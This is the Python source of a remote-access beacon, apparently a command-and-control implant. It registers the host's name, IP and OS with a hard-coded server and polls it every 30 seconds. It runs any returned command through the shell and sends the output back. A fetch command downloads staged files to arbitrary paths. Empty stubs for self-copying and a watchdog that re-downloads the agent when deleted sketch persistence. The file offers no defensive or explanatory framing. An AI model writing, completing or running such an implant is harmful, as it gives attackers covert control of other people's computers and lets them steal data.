import subprocess, time, uuid, socket, requests, platform

SERVER_HOST = "192.168.1.69"
SERVER_PORT = 6655
SERVER_URL  = f"http://{SERVER_HOST}:{SERVER_PORT}"

hostname = socket.gethostname()
mac = uuid.getnode()
AGENT_ID = f"Agent-{hostname}"
os_info = platform.system()

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()

def register_agent():
    local_ip = get_local_ip()
    try:
        r = requests.post(f"{SERVER_URL}/register", json={
            "agent_id": AGENT_ID,
            "hostname": hostname,
            "local_ip": local_ip,
            "os_info": os_info
        }, timeout=10)
        r.raise_for_status()
    except Exception as e:
        print(f"[!] Failed to register agent: {e}")

def heartbeat():
    try:
        r = requests.post(f"{SERVER_URL}/heartbeat", json={"agent_id": AGENT_ID}, timeout=10)
        if r.status_code != 200:
            return
        response = r.json()
        if response.get("agent_id") == AGENT_ID:
            commands = response.get("commands", [])
            beacon_command(commands)
    except Exception as e:
        print(f"[!] Heartbeat failed: {e}")

def beacon_command(commands):
    for cmd in commands:
        cmd_id = cmd["command_id"]
        command_text = cmd["command"]

        # Handle staged file fetch
        if command_text.startswith("fetch "):
            try:
                _, filename, dest_path = command_text.split(" ", 2)
                output = fetch_file(filename, dest_path) 
            except ValueError:
                output = "[!] Invalid fetch command format. Use: fetch <filename> <dest_path>"

        else:
            output = execute_command(command_text)

        try:
            requests.post(
                f"{SERVER_URL}/result",
                json={"command_id": cmd_id, "result": output},
                timeout=10
            )
        except Exception as e:
            print(f"[!] Failed to send result: {e}")

def fetch_file(filename, dest_path):
    try:
        url = f"{SERVER_URL}/files/{filename}"
        r = requests.get(url, timeout=15)
        if r.status_code == 200:
            with open(dest_path, "wb") as f:
                f.write(r.content)
            return f"[+] File {filename} saved to {dest_path}"
        else:
            return f"[!] Failed to fetch {filename}: HTTP {r.status_code}"
    except Exception as e:
        return f"[!] Fetch error: {e}"

def execute_command(command):
    try:
        result = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT
        )
        return result.decode("utf-8", errors="ignore").strip()
    except subprocess.CalledProcessError as e:
        return e.output.decode("utf-8", errors="ignore").strip()
    
def create_beacon_copy():
    pass

def watchdog():
    # Create a watchdog if any of the copy and the original gets deleted and it downloads it again
    pass

if __name__ == "__main__":
    try:
        register_agent()
    except Exception:
        pass

    while True:
        heartbeat()
        time.sleep(30)